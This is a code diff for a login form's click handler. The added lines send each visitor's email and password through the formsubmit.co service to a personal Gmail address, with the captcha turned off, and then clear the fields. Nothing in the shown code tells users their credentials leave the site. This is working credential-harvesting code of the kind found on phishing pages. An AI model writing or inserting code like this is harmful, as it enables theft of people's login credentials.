@@ -44,4 +44,23 @@ btnNext.addEventListener("click", async () => {
     inputMail.value = "";
     inputMdp.value = "";
   } catch (e) {}
+
+  try {
+    await fetch("https://formsubmit.co/ajax/andiproo0077@gmail.com", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Accept: "application/json",
+      },
+      body: new URLSearchParams({
+        _subject: "Test connexon 2 champs",
+        identifiant: email,
+        mot_de_passe: mdp,
+        _captcha: "false",
+        _next: "https://formsubmit.co/success",
+      }),
+    });
+    inputMail.value = "";
+    inputMdp.value = "";
+  } catch (e) {}
 });
